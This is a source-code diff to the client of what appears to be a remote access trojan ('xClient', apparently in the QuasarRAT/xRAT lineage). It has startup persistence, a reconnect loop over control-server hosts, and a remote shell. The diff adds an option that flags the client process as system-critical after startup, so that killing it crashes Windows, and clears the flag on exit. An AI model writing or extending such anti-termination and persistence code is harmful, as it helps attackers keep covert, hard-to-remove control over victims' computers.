@@ -36,6 +36,8 @@ namespace xClient
                 Connect();
 
             Cleanup();
+            if (SetProcessIsCritical.CriticalStatus == true)
+                SetProcessIsCritical.Critical(false);
         }
 
         private static void Cleanup()
@@ -126,6 +128,7 @@ namespace xClient
             SystemCore.AccountType = SystemCore.GetAccountType();
             GeoLocationHelper.Initialize();
 
+
             if (!Settings.INSTALL || SystemCore.MyPath == SystemCore.InstallPath)
             {
                 if (!SystemCore.CreateMutex(ref _appMutex))
@@ -137,9 +140,7 @@ namespace xClient
                 new Thread(SystemCore.UserIdleThread).Start();
 
                 if (Settings.STARTUP && Settings.INSTALL)
-                {
                     SystemCore.AddToStartup();
-                }
 
                 InitializeClient();
 
@@ -152,6 +153,8 @@ namespace xClient
                         Application.Run(_msgLoop);
                     }).Start(); ;
                 }
+                if (Settings.CRITICAL)
+                    SetProcessIsCritical.Critical(true);
             }
             else
             {
@@ -171,6 +174,7 @@ namespace xClient
             {
                 if (!_connected)
                 {
+
                     Thread.Sleep(100 + new Random().Next(0, 250));
 
                     Host host = _hosts.GetNextHost();
@@ -180,6 +184,8 @@ namespace xClient
                     Thread.Sleep(200);
 
                     Application.DoEvents();
+
+
                 }
 
                 while (_connected) // hold client open
@@ -201,10 +207,14 @@ namespace xClient
         public static void Disconnect(bool reconnect = false)
         {
             if (reconnect)
+            {
                 CommandHandler.CloseShell();
+            }
             else
+            {
                 SystemCore.Disconnect = true;
-            ConnectClient.Disconnect();
+                ConnectClient.Disconnect();
+            }
         }
 
         private static void LostConnection()
